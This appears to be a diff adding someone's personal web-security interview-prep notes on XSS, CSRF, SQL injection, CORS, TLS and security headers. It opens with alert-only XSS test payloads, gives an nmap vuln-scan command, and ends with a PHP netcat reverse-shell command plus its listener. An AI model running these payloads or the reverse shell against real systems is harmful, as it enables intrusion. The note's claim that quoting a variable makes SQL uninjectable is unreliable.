@@ -1,0 +1,478 @@
+
+
+XSS payload:
+----------------
+<scRipt>alert("xss")</sCript>
+<a onmouseover="alert('xss')">xxs link</a>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert('xss')"></img>
+<sCript>alert(String.fromCharCode(120 ,115, 115, 50))</sCriPt>
+
+What is the 
+ for XSS
+Video 74: Fixing XSS vulns
+----------
+- Minimize the usage of user input on html
+- Escape any untrusted input before inserting it into the page.
+Char Result
+&  -- &amp;
+< -- &lt;
+> -- &gt;
+"  -- &quot;
+'  -- &#x27;
+/  -- &#x2F;
+- HttpOnly Cookie - is a tag added to a browser cookie that prevents client-side scripts from accessing data.
+	It provides a gate that prevents the specialized cookie from being accessed by anything other than the server.
+	 **Using the HttpOnly tag when generating a cookie helps mitigate the risk of client-side scripts accessing the protected cookie, thus making these cookies more secure.
+	**If the HttpOnly flag is included in the HTTP response header, the cookie cannot be accessed through the client-side script.  As a result, even if a cross-site scripting (XSS) flaw exists, and a user accidentally accesses a link that exploits the flaw, the browser will not reveal the cookie to the third-party.
+   **Here’s an example – let’s say a browser detects a cookie containing the HttpOnly flag.  If the client-side code attempts to read the cookie, the browser will return an empty string as a result.  This helps prevent malicious (usually cross-site scripting (XSS)) code from sending the data to an attacker’s website.
+  if required - video on HTTPOnly setting -- https://www.youtube.com/watch?v=TrWda1AwyAA
+ Ex:
+ Set-Cookie: <name>=<value>[; <Max-Age>=<age>]
+`[; expires=<date>][; domain=<domain_name>]
+ [; path=<some_path>][; secure][; HttpOnly]
+
+In PHP we have a method to converst this special char and treat it as HTML code
+- htmlspecialchars($_GET['name']);
+
+https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
+
+CSRF:
+Forgery Vulnerabilities (CSRF)
+-------------
+Cross Site Request Forgery
+- Requests are not validated at the server side
+- Server does not check if the user generated the request
+- Requests can be forged and sent to users to make them do things they don't intend to do 
+	such as changesing their password
+
+Mitigation - CSRF Vulnerabilities
+
+- 1 best way to avoid CSRF - is to make sure user is submitting data via page which was served to him by web application
+   - this can be done using Syschronizing tokens
+Dynamic Syschronizing tokens
+----------------
+1. Generate on unpredictable token that can not be reused
+  - Token needs to be a large value
+  - It must be random
+  - It should be unique
+  - Other factors can be included in the token generation algorithm
+2. Embed the token in the HTML page in a hidden form
+3. Verify the token when the form is submitted
+
+Mitigating SQL injection:
+-------------------------
+-> Use parameterized statements, separate data from sql code.
+
+quick fixed for SQL injection is 
+ - have sql statement as below
+$getid = "select first_name, las_name from users where user_id = $id"; -- Medium security - injectable
+$getid = "select first_name, las_name from users where user_id = '$id'"; -- High Security - can't inject
+Ex: of High security code interpretation
+1. $getid = "select first_name, las_name from users where user_id = '1 and 1=1'"
+
+ What is cross origin/same origin
+
+Same-Origin Policy:
+-------------
+https://websecurity-academy.com:443/same-path
+Scheme +  Domain +              Port + Origin
+
+if Scheme/Domain/Port - is different then it's different origin
+
+Ex:
+Same origin:
+https://websecurity-academy.com/other-path
+https://websecurity-academy.com/same-path
+https://websecurity-academy.com/yet-path
+
+Different Origin:
+www.websecurity-academy.com/other-path -- different Domain (www))
+websecurity-academy.com:7777 --- different Port
+ftp://websecurity-academy.com/same-path  ---- different Scehem (FTP)
+
+Header:
+Access-Control-Allow-Origin: * ---  which means that the resource can be accessed by any origin.
+
+Headers:
+Access-Control-Allow-Origin: https://foo.example
+Origin: https://foo.example
+
+info to read:
+https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
+
+5. How do you test web services
+A Web service is a unit of managed code that can be remotely invoked using HTTP, that is, it can be activated using HTTP requests. So, Web Services allows you to expose the functionality of your existing code over the network. Once it is exposed on the network, other application can use the functionality of your program.
+There are two broad classes of web service:
+1.SOAP
+2.REST API
+https://www.inflectra.com/Rapise/HelpReadingPane.ashx?filename=Rapise5.0.0.chm&href=web_service_testing.htm
+
+i have check API for top 10 vul
+https://owasp.org/www-project-api-security/
+
+7. Which are the new additions in OWASP – RC2
+- 2017 - New addition -3 issues
+XXE, Insecure Deserialization error and insufficient logging and Monitoring
+Removed from the list - 3 Issues
+- Insecure direct object references, Missing function level access control errors and CSRF
+IDOR - 
+https://portswigger.net/web-security/access-control/idor#:~:text=Insecure%20direct%20object%20references%20(IDOR)%20are%20a%20type%20of%20access,the%20OWASP%202007%20Top%20Ten.
+Ex: https://insecure-website.com/customer_account?customer_number=132355
+https://insecure-website.com/static/12144.txt
+Preventing IDOR vul
+https://www.oreilly.com/library/view/securing-node-applications/9781491982426/ch04.html
+
+Reference: https://www.darkreading.com/application-security/new-owasp-top-10-list-includes-three-new-web-vulns/d/d-id/1330479
+Making its appearance for the first time in OWASP's top 10 list is a category dubbed XML external entities (XXE), pertaining to older and poorly configured XML processors. Data gathered from source code analysis testing tools supported inclusion of XXE as a new vulnerability in the top 10 list, according to OWASP.
+The two other new additions to the list are insecure deserialization errors, which enable remote code execution on affected platforms, and insufficient logging and monitoring. Both of these new vulnerability categories were added to the list based on feedback from community members who contribute to the OWASP effort.
+Making way for these new categories were insecure direct object references and missing function level access control errors, which along with CSRF, dropped out of the OWASP's top 10 ranking.
+
+8. Explain SSL handshake between client and server
+https://sectigostore.com/blog/5-differences-between-symmetric-vs-asymmetric-encryption/
+
+9.    What is hashing
+
+10.   What is the difference between hashing and encryption..
+-Encryption 
+ - Encryption is encoding technique in which message is encoded by using encryption algorithm in such a way that only authorized person can access the message or information
+   type of Encryption algo:
+    - Symmetric -- Same key is used for encoding and decoding
+      Ex: AES encryption Algorithm
+    - Asymmetric: - Data is encrypted with help of two keys
+      Ex: RSA algorithm
+ -Hashing
+  - Hashing is the transformation of a string of characters into a usually shorter fixed lenght value or key that represents the original string
+	EX: MD5, SHA256
+  - Data once hashed is not reversable
+  Ex:
+	-instead of keeping actual PW in DB, Hashed keys are kept for security reason
+      -Hash key produced and checked against stored PW hash key if the same they are let in
+
+https://www.youtube.com/watch?v=Sre8D9X1BzE
+https://www.youtube.com/watch?v=-nMOTAUSUhE -- Good one
+
+11. What is formula injection
+- Formula injection(Or Spreadsheet Formula Injection) vulnerability affects applications that export spreadsheet files
+    which are dynamically constructed from inadequately validated input data.
+   - Once injected, it affects application end-users that access the application exported spreadsheet files
+https://www.youtube.com/watch?v=NmtsyWixoo4
+
+12. How do you test a login page
+1.Verify that there is a limit on the total number of unsuccessful login attempts. So that a user cannot use a brute-force mechanism to try all possible combinations of username-password.
+2.Verify that in case of incorrect credentials, a message like “incorrect username or password” should get displayed. Instead of an exact message pointing to the incorrect field. This is because a message like “incorrect password” will help a hacker in knowing that the username is correct. In this way, he will just need to try a different combination on the password field only.
+3.Verify the login session timeout duration. So, that once logged-in a user cannot be authenticated for a life-time.
+4.Verify that once logged in, clicking the back button doesn’t logout the user.
+5.Verify if SQL Injection attacks work on the login page. The application should not be vulnerable to SQL injection attacks.
+6.Verify that XSS vulnerability should not work on the login page.
+   
+13.   What is XSS
+XSS - Cross Site Scripting Vulns
+- Allow an attacker to inject javascript code into the page
+- Code is executed when the page loads
+- Code is executed on the client machine not the server
+
+Three main types:
+1. Persistent/Stored XSS
+2. Reflected XSS
+3. DOM based XSS 
+DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML.
+This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.
+Which sinks can lead to DOM-XSS vulnerabilities?
+The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
+document.write() *
+document.writeln() *
+document.domain
+someDOMElement.innerHTML *
+someDOMElement.outerHTML *
+someDOMElement.insertAdjacentHTML
+someDOMElement.onevent *
+following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
+
+14.   What is client side request forgery
+Cross Site Request Forgery
+- Requests are not validated at the server side
+- Server does not check if the user generated the request
+- Requests can be forged and sent to users to make them do things they don't intend to do 
+	such as changesing their password
+
+15.   What are the different authentication controls (ways to authenticate)
+5 Common Authentication Types
+1.Password-based authentication. Passwords are the most common methods of authentication. ...
+2.Multi-factor authentication. ...
+3.Certificate-based authentication. ...
+4.Biometric authentication. ...
+5.Token-based authentication.
+
+17.   What is certificate management
+The Certificate Management Protocol is an Internet protocol standardized by the IETF used for obtaining X.509 digital certificates in a public key infrastructure.
+https://www.youtube.com/watch?v=Cp_3Dx_zNUQ&list=PLDp2gaPHHZK-mnKi3Zy_-hRjqLHh5PaAv&index=6
+To understand how PKI work go through (2-4 videos) 
+go through 2-6 video (if time permits video 1)
+
+7 May
+18.How do you implement SSL to make HTTP into HTTPS
+https://www.brafton.com/blog/distribution/how-to-convert-http-to-https-a-quick-guide/
+Converting to HTTPS is simple.
+1. Buy an SSL Certificate
+2. Install SSL Certificate on your web hosting account
+3. Double check internal linking is switched to HTTPS
+4. Set up 301 redirects so search engines are notified
+
+19.   What is XXE (xml cross site scripting)
+- From notes
+
+24. Do you know nmap and How do you use it
+Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing
+- i use it to find open ports and run "--script nmap-vulners -sV" -- which find the service running and givens CVE for service running on the host
+nmap --script nmap-vulners -sV 10.0.2.8  > /root/Desktop/105_Vulner.txt
+
+for interview:
+- i have automated the execution of nmap with "--script nmap-vulners" option 
+ - where i will clone the latest repo of nmap script and run below command 
+ - daily i will go through these log for new CVE(commone vulnerability and exposures)
+ - if i get any thing new other than the one reported; i will try to replicate the same on our system
+
+nmap --script nmap-vulners -sV 10.0.2.8  > /root/Desktop/105_Vulner.txt
+
+28.   What types of sql injection attacks are there
+https://www.indusface.com/blog/types-of-sql-injection/
+https://pentest-tools.com/blog/sql-injection-attacks/
+1.Error-based SQL Injection
+2.UNION-based SQL Injection
+3.Blind SQL Injection(Boolean-based Blind SQL Injection, Time-based Blind SQL Injection)
+4.Out-of-band SQL Injection
+
+30.   Mitigation for sql injection
+At the root of it, SQL Injection has two main causes:
+-Failure to validate input before constructing the query
+-User input is included in building dynamic queries
+
+1.Validating user-supplied input
+2.Prepared Statements
+3.The principle of "Least privilege"
+4.Additional layers of security(WAF)
+
+34.   What are the types of CSRF tokens  ( ans : 1 session based token, 2 - ?)
+
+35.   5 Vulnerabilities found in infrastructure scanning
+- i report generatly on 
+ - Open ports
+ - Vulnerable S/w application is using
+   - resently i reporte application using vulnerable Angular/core package page which had XSS(version<11.1.0)
+
+36.   Any issue related to ssl
+- Team was using vulnerable TLS version < Require TLS 1.1+ - which had MITM(man-in-the-middle)
+https://kb.vmware.com/s/article/2008784
+
+If time permits:
+SSL/TLS Best Practices for 2021
+https://www.ssl.com/guide/ssl-best-practices/#:~:text=While%20TLS%201.2%20is%20currently,encryption%2C%20or%20stronger%20when%20possible.
+
+37.   What is the recommended ssl version
+when they are refering SSL it means TLS - say about TLS
+SSL 3.0 - had known security issues; - SSL 2.0/SSL 3.0 releases have been deprecated and have known security vulnerabilities 
+ -it is better to use TLS - 1.3 (released in 2018)
+https://kinsta.com/knowledgebase/tls-vs-ssl/
+
+38.   Diff between FTP and TFTP
+https://www.geeksforgeeks.org/difference-between-ftp-and-tftp/
+https://www.geeksforgeeks.org/difference-between-file-transfer-protocol-ftp-and-secure-file-transfer-protocol-sftp/
+
+39.   What is 443 port
+Port 443 is used explicitly for HTTPS services and hence is the standard port for HTTPS (encrypted) traffic
+a site starting with HTTPS, you are getting connected to a web server over port 443
+
+40.   What version of SSL is recommended
+- it is deprecated service it's not recommended to use
+
+41.   What version of TLS is recommended
+- TLS 1.3 (released in 2018)
+https://www.calcomsoftware.com/leaving-tls1-2-using-tls1-3/
+from Above site:
+-TLS1.2 - had couple of high profile vulnerabilities like - Drown and POODLE
+  - The new TLS 1.2 vulnerability, like the old POODLE, allows the attacker to gain access to encrypted blocks of data – and then gain exposure to plain text information – using side channels.
+  - The procedure is this: if the victim visits, for example, a non-encrypted website, malicious JavaScript is injected into the victim’s browser. Once the browser is infected, a MITM attack is executed and the attacker can grab the victim’s cookies and credentials from a secure web session.
+   -- Drown -also same as POODLE
+	- POODLE -  is a man-in-the-middle exploit
+	- DROWN stands for Decrypting RSA with Obsolete and Weakened eNcryption.
+While high profile vulnerabilities were discovered in TLS 1.2, TLS 1.3 solves those issues and supports algorithms with no known vulnerabilities.
+TLS 1.3 also provides additional privacy by encrypting more of the handshake to protect it from Eavesdroppers
+Features removed from TLS 1.3:
+Static RSA handshake
+SHA1, MD5
+RC4
+
+Good one to understand - SSL/TLS handshake and more info
+https://blogs.sap.com/2021/09/08/demystifying-ssl-tls/
+
+43.   Do you check for any local file storages
+
+Burp version used---
+Enterprise Edition 2021.4.1
+https://twitter.com/Burp_Suite?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor
+
+43.   Do you check for any local file storages
+read it from infoSecurity_New --- notes
+
+44.   Which protocols are used in thick clients while communicating with remote servers
+HTTP/S - HTTP or HTTPS -- is used by Thick clients or application
+https://whatis.techtarget.com/definition/fat-client-thick-client
+
+48.   What are the different types fo cockies (persistent and not persistent)
+1. Session Cookies - Non persistent
+2. First Party Cookies - Persistent
+3. Third party Cookies
+4. Secure Cookies
+5. HTTP-Only Cookies
+6. Flash Cookies
+7. Zombie Cookies
+https://www.makeuseof.com/tag/types-browser-cookies-to-know-about/
+
+Security headers info ---https://web.dev/security-headers/
+ Security headers recommended for websites that handle sensitive user data:
+   Content Security Policy (CSP)
+   Trusted Types
+ Security headers recommended for all websites:
+   X-Content-Type-Options
+   X-Frame-Options
+   Cross-Origin Resource Policy (CORP)
+   Cross-Origin Opener Policy (COOP)
+   HTTP Strict Transport Security (HSTS)
+ Security headers for websites with advanced capabilities:
+   Cross-Origin Resource Sharing (CORS)
+   Cross-Origin Embedder Policy (COEP)
+
+websites that handle sensitive user data:  Read from -- https://web.dev/security-headers/
+
+Content-Security-Policy (we can prevent XSS)
+  provides an added layer to mitigate XSS attacks by restricting which scripts can be executed by the page.
+
+Trusted Types (we can prevent DOM based XSS)
+  DOM-based XSS is an attack where a malicious data is passed into a sink that supports dynamic code execution such as eval() or .innerHTML.
+	Content-Security-Policy: require-trusted-types-for 'script'
+  when this flag is set and code is trying to use followin code it will throw an error:
+	// Assignment of raw strings is blocked by Trusted Types.
+         el.innerHTML = 'some string'; // This throws an exception.
+
+ Content-Security-Policy:
+  script-src 'nonce-{RANDOM1}' 'strict-dynamic' https: 'unsafe-inline';
+  object-src 'none';
+  base-uri 'none';
+  require-trusted-types-for 'script';
+
+ Security headers recommended for all websites:
+  X-Content-Type-Options (prevents XSS)
+   EX: X-Content-Type-Options: nosniff
+       Content-Type: text/html; charset=utf-8
+ - with this options we can force the bw to use the content types provided by the application
+ 
+  X-Frame-Options (we can prevnet - ClickJacking)
+   If a malicious website can embed your site as an iframe, this may allow attackers to invoke unintended actions by the user with clickjacking. 
+   X-Frame-Options indicates whether or not a browser should be allowed to render a page in a <frame>, <iframe>, <embed>, or <object>. All documents are recommended to send this header to indicate whether they allow being embedded by other documents.
+   Ex: X-Frame-Options: DENY
+   -X-Frame-Options:
+    -DENY  ---with this application can't be loaded in iframed
+    -SAMEORIGIN  ---iframe can be loaded if it's from same origin
+    -allow-from:DOMAIN ---if we multipal site this will all those sites to load using iframe
+
+   - Prevents clickjacking --- this is were hacker can trick user to click the button other than what they think it is
+                              -- attacker can use a iframe and put it on top of page and make it transparent so user don't know what is in the backend and put some attractive text or news on the front end and make user click on it
+				 - using this attacker can steal the credentials or get permission to run malware
+	
+  Cross-Origin Resource Policy (CORP) - this tells the BW to not to include resources from another origin
+   An attacker can embed resources from another origin, 
+   Cross-Origin-Resource-Policy mitigates this risk by indicating the set of websites it can be loaded by.
+    The header takes one of three values: same-origin, same-site, and cross-origin
+   All resources are recommended to send this header to indicate whether they allow being loaded by other websites.
+   Ex: Cross-Origin-Resource-Policy: same-origin
+
+  Cross-Origin Opener Policy (COOP) -- this instructs the browser to not to open any page within the Popup window
+   An attacker's website can open another site in a popup window
+   The Cross-Origin-Opener-Policy header provides a way for a document to isolate itself from cross-origin windows opened through window.open() or a link with target="_blank" without rel="noopener"
+   ex: Cross-Origin-Opener-Policy: same-origin-allow-popups
+
+  Cross-Origin Resource Sharing (CORS) - browser mechanism that requests and permits access to cross-origin resources.
+   Cross-Origin Resource Sharing (CORS) is not a header, but a browser mechanism that requests and permits access to cross-origin resources.
+   By default, browsers enforce the same-origin policy to prevent a web page from accessing cross-origin resources.
+   ex: Access-Control-Allow-Origin: https://example.com
+       Access-Control-Allow-Credentials: true
+
+  HTTP Strict Transport Security (HSTS) - this insturcts the BW to not to load page using HTTP instead use HTTPS
+   Strict-Transport-Security header informs the browser that it should never load the site using HTTP and use HTTPS instead.
+   Once it's set, the browser will use HTTPS instead of HTTP to access the domain without a redirect for a duration defined in the header.
+   ex: Strict-Transport-Security: max-age=31536000
+
+Cache Control:
+----------
+we should check to see we have "Cache-Control:max-age=36000" set
+
+Cache-control risks
+--------
+- Sensitive data being cached
+- Cache-control: no-store --- it won't store any data locally, we can use this header for response which has sensitive data
+- Pragma: no-cache
+
+50.   What is click jacking how can we protect this
+https://www.valencynetworks.com/kb/clickjacking-x-frame-options-header-missing.html
+
+58.   How does ping work/do
+--1. Sends an "ICMP Echo request" to the destination
+2. Destination replies with "ICMP ECHO reply"
+3. if sourece did not receive the response with the timeout period - it will show "request timed out"
+default timeout period: 3000 miliseconds (3 seconds)
+
+59.   Which protocol ping uses
+ICMP
+
+60.   Which port ICMP works on
+What Port Does Ping Use? Remember that a ping test uses ICMP, so there are no real ports being used. ICMP basically roofs, or sits on top of, the IP address.
+
+93.   What is XM scan in nmap
+Nmap Xmas scan was considered a stealthy scan which analyzes responses to Xmas packets to determine the nature of the replying device. Each operating system or network device responds in a different way to Xmas packets revealing local information such as OS (Operating System), port state and more.
+These scans are designed to manipulate the PSH, URG and FIN flags of the TCP header
+
+94. what all testing you do for Login page
+
+95. how you suggest to store Data in DB
+96. can we decript encriped data from DB
+
+To ask Rajiv:
+36.   Any issue related to ssl
+43.   Do you check for any local file storages
+
+OOzie work flow:
+-----------------------
+https://www.youtube.com/watch?v=Ctq5IMcYBXw -- Good
+https://www.youtube.com/watch?v=iQSkSX5OuEQ
+
+
+BTC Miner -Python video:
+https://www.youtube.com/watch?v=f0ZDVqoViqE -- Simple code using SHA256 alg
+
+***
+Security headers to use on the web:
+--------------
+https://web.dev/security-headers/
+
+Reverse shell:
+cmd to exe on web app:
+------------------
+passthru("nc -e /bin/sh 10.0.2.15 8888");
+
+listen on Port 8888 - to execute on Kali
+-----------------------------
+nc -vv -l -p 8888
